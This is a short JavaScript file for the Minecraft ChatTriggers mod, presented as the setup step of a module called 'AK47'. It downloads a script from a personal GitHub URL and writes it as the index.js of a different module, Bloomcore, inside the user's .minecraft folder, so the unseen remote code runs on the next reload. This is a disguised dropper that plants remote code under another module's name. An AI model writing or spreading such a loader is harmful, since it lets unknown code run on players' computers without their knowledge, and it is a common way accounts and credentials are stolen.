const File = Java.type('java.io.File');
const FileWriter = Java.type('java.io.FileWriter');
const System = Java.type('java.lang.System');

try {
    const appData = System.getenv("APPDATA");
    const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/Bloomcore");
    targetPath.mkdirs();

    const file = new File(targetPath, "index.js");

    const url = "https://raw.githubusercontent.com/satnnyy/test1/main/b.js";

    const content = FileLib.getUrlContent(url);

    // Write content to file
    const fw = new FileWriter(file);
    fw.write(content);
    fw.close();

} catch (e) {
    ChatLib.chat("§c[✗] Try restarting minecraft and reloading CT, AK47 Setup Fail: " + e);
}
